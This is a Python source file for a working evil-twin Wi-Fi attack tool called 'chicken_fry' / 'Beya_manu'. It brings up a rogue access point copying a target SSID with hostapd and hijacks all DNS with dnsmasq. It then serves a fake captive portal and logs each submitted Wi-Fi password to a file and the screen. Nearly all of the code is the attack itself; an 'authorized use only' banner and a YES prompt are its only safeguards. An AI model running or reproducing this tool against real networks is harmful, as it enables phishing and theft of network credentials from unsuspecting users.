#!/usr/bin/env python3

import os
import time
import subprocess
import threading
import json

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from datetime import datetime

from rich.panel import Panel
from rich.table import Table
from pyfiglet import figlet_format

from ui_bus import queue_panel, safe_panel, safe_print, flush_ui_events


GATEWAY_IP      = "192.168.29.1"
DHCP_START      = "192.168.29.10"
DHCP_END        = "192.168.29.50"

LOGS_DIR        = "logs"
LOG_FILE        = os.path.join(LOGS_DIR, "captured.txt")

TEMPLATES_DIR   = os.path.join(os.path.dirname(__file__), "templates")
PORTAL_TEMPLATE = os.path.join(TEMPLATES_DIR, "portal.html")

HTTP_PORT       = 80

HOSTAPD_CONF    = "/tmp/chicken_fry_hostapd.conf"
DNSMASQ_CONF    = "/tmp/chicken_fry_dnsmasq.conf"


captured_passwords = []
target_ssid        = ""
stop_event         = threading.Event()


def _require(tool):
    import shutil

    if not shutil.which(tool):
        raise RuntimeError(
            f"[chicken_fry] Required tool '{tool}' not found.\n"
            f"Install with: sudo apt install {tool}"
        )


def _run(cmd, check=True):
    try:
        subprocess.run(
            cmd,
            check=check,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True

    except subprocess.CalledProcessError:
        return False


def _prepare_interface(iface):
    safe_print(f"[cyan][chicken_fry] Preparing interface {iface}...[/cyan]")

    base_iface = iface.replace("mon", "") if iface.endswith("mon") else iface

    _run(["sudo", "airmon-ng", "stop", iface], check=False)
    _run(["sudo", "ip", "link", "set", base_iface, "up"], check=False)

    safe_print(f"[green][chicken_fry] Interface ready: {base_iface}[/green]")

    return base_iface


def _assign_ip(iface):
    safe_print(f"[cyan][chicken_fry] Assigning IP {GATEWAY_IP} to {iface}...[/cyan]")

    _run(["sudo", "ip", "addr", "flush", "dev", iface], check=False)

    result = _run([
        "sudo",
        "ip",
        "addr",
        "add",
        f"{GATEWAY_IP}/24",
        "dev",
        iface
    ])

    if not result:
        raise RuntimeError(f"[chicken_fry] Failed to assign IP to {iface}")

    safe_print(f"[green][chicken_fry] IP assigned: {GATEWAY_IP}[/green]")


def _start_mesa_ap(ssid, iface, channel):
    _require("hostapd")

    config = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""

    with open(HOSTAPD_CONF, "w") as f:
        f.write(config)

    safe_print(
        f"[cyan][chicken_fry] Starting mesa AP: "
        f"'{ssid}' on channel {channel}...[/cyan]"
    )

    # FIX: fully detach child process streams to stop terminal corruption
    proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    time.sleep(2)

    if proc.poll() is not None:
        raise RuntimeError("[chicken_fry] hostapd failed to start")

    safe_print(f"[green][chicken_fry] Mesa AP running: SSID '{ssid}'[/green]")

    return proc


def _start_dnsmasq(iface):
    _require("dnsmasq")

    config = f"""interface={iface}
dhcp-range={DHCP_START},{DHCP_END},12h
dhcp-option=3,{GATEWAY_IP}
dhcp-option=6,{GATEWAY_IP}
server={GATEWAY_IP}
address=/#/{GATEWAY_IP}
no-resolv
log-queries
"""

    with open(DNSMASQ_CONF, "w") as f:
        f.write(config)

    _run(["sudo", "pkill", "-f", "dnsmasq"], check=False)

    time.sleep(1)

    safe_print("[cyan][chicken_fry] Starting dnsmasq (DHCP + DNS hijack)...[/cyan]")

    # FIX: fully detach dnsmasq streams too
    proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    time.sleep(1)

    if proc.poll() is not None:
        raise RuntimeError("[chicken_fry] dnsmasq failed to start")

    safe_print("[green][chicken_fry] dnsmasq running — DNS hijack active[/green]")

    return proc


def _load_portal(ssid):
    with open(PORTAL_TEMPLATE, "r") as f:
        html = f.read()

    return html.replace("{{ ssid }}", ssid)


def _log_capture(ssid, password):
    os.makedirs(LOGS_DIR, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = f"[{timestamp}] SSID: {ssid} | Password: {password}\n"

    with open(LOG_FILE, "a") as f:
        f.write(entry)

    captured_passwords.append({
        "time": timestamp,
        "ssid": ssid,
        "password": password
    })

    queue_panel(
        f"[bold green]PASSWORD CAPTURED![/bold green]\n\n"
        f"[yellow]SSID:[/yellow] {ssid}\n"
        f"[yellow]Password:[/yellow] [bold white]{password}[/bold white]\n"
        f"[yellow]Time:[/yellow] {timestamp}\n"
        f"[yellow]Saved to:[/yellow] {LOG_FILE}",
        border_style="green",
        width=60
    )


class PortalHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def _redirect_to_portal(self):
        self.send_response(302)
        self.send_header("Location", f"http://{GATEWAY_IP}/")
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == "/" or parsed.path == "/index.html":
            html = _load_portal(target_ssid)

            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()

            self.wfile.write(html.encode())

        else:
            self._redirect_to_portal()

    def do_POST(self):
        parsed = urlparse(self.path)

        if parsed.path == "/submit":

            length = int(self.headers.get("Content-Length", 0))

            body = self.rfile.read(length).decode()

            params = parse_qs(body)

            password = params.get("password", [""])[0].strip()
            ssid = params.get("ssid", [target_ssid])[0].strip()

            if password:
                _log_capture(ssid, password)

            response = json.dumps({"status": "ok"})

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()

            self.wfile.write(response.encode())

        else:
            self._redirect_to_portal()


def _start_http_server():

    # FIX: timeout prevents blocking forever on handle_request()
    server = HTTPServer((GATEWAY_IP, HTTP_PORT), PortalHandler)
    server.timeout = 1

    safe_print(
        f"[green][chicken_fry] Portal server running at "
        f"http://{GATEWAY_IP}[/green]"
    )

    while not stop_event.is_set():
        server.handle_request()

    server.server_close()


def _cleanup(processes, iface):

    # FIX: replaced raw print() with thread-safe output
    safe_print("\n[cyan][chicken_fry] Stopping all services...[/cyan]")

    for proc in processes:

        if proc and proc.poll() is None:

            try:
                proc.terminate()
                proc.wait(timeout=5)

            except Exception:
                proc.kill()

    for f in [HOSTAPD_CONF, DNSMASQ_CONF]:

        if os.path.exists(f):
            os.remove(f)

    _run(["sudo", "ip", "addr", "flush", "dev", iface], check=False)

    # FIX: thread-safe cleanup message
    safe_print("[green][chicken_fry] Cleanup complete.[/green]")


def _show_summary():

    if not captured_passwords:

        safe_panel(
            "[yellow]No passwords were captured during this session.[/yellow]",
            title="[bold]Beya_manu Summary[/bold]",
            border_style="yellow",
            width=60
        )

        return

    table = Table.grid(padding=(0, 2))

    table.add_column(style="yellow")
    table.add_column(style="white")

    table.add_row("Total captured:", str(len(captured_passwords)))
    table.add_row("Log file:", LOG_FILE)
    table.add_row("", "")

    for i, entry in enumerate(captured_passwords, 1):

        table.add_row(
            f"Attempt {i}:",
            f"{entry['password']} ({entry['time']})"
        )

    from rich.console import Console as _Console

    _Console().print(
        Panel(
            table,
            title="[bold green]Beya_manu Summary[/bold green]",
            border_style="green",
            width=60
        )
    )


def run_chicken_fry_attack(bssid, channel, iface, ssid):

    global target_ssid

    target_ssid = ssid

    safe_print(figlet_format("BEYA_MANU"), style="bold red")

    safe_panel(
        f"[bold red]AUTHORIZED USE ONLY[/bold red]\n\n"
        f"[white]Only run this on your own lab network.[/white]\n\n"
        f"[yellow]Target SSID :[/yellow] {ssid}\n"
        f"[yellow]Target BSSID:[/yellow] {bssid}\n"
        f"[yellow]Interface   :[/yellow] {iface}\n"
        f"[yellow]Channel     :[/yellow] {channel}\n"
        f"[yellow]Gateway IP  :[/yellow] {GATEWAY_IP}\n"
        f"[yellow]Log file    :[/yellow] {LOG_FILE}",
        border_style="red",
        width=60
    )

    confirm = input("\nType YES to confirm and start the attack: ").strip()

    if confirm != "YES":

        # FIX: removed unsafe raw print()
        safe_print("[yellow][chicken_fry] Cancelled.[/yellow]")

        return False

    processes = []

    try:
        managed_iface = _prepare_interface(iface)

        _assign_ip(managed_iface)

        hostapd_proc = _start_mesa_ap(ssid, managed_iface, channel)
        processes.append(hostapd_proc)

        dnsmasq_proc = _start_dnsmasq(managed_iface)
        processes.append(dnsmasq_proc)

        server_thread = threading.Thread(
            target=_start_http_server,
            daemon=True
        )

        server_thread.start()

        safe_panel(
            f"[bold green]Beya_manu is ACTIVE[/bold green]\n\n"
            f"[white]Mesa AP '[bold]{ssid}[/bold]' is broadcasting.[/white]\n"
            f"[white]Waiting for clients to connect.[/white]\n\n"
            f"[yellow]Press Ctrl+C to stop.[/yellow]",
            border_style="green",
            width=60
        )

        last_heartbeat = time.time()

        # FIX: all UI now flows through queue system only
        while not stop_event.is_set():

            flush_ui_events()

            stop_event.wait(1)

            if time.time() - last_heartbeat >= 30:

                queue_panel(
                    f"[cyan]Still running...[/cyan]\n\n"
                    f"[white]Passwords captured so far:[/white] "
                    f"[bold cyan]{len(captured_passwords)}[/bold cyan]",
                    border_style="cyan",
                    width=60
                )

                last_heartbeat = time.time()

    except KeyboardInterrupt:

        # FIX: thread-safe interrupt message
        safe_print("\n[yellow][chicken_fry] Stopped by user.[/yellow]")

    except RuntimeError as err:

        safe_print(f"\n[red][chicken_fry] Error: {err}[/red]")

    finally:

        stop_event.set()

        _cleanup(
            processes,
            managed_iface if 'managed_iface' in locals() else iface
        )

        flush_ui_events()

        _show_summary()

    return len(captured_passwords) > 0
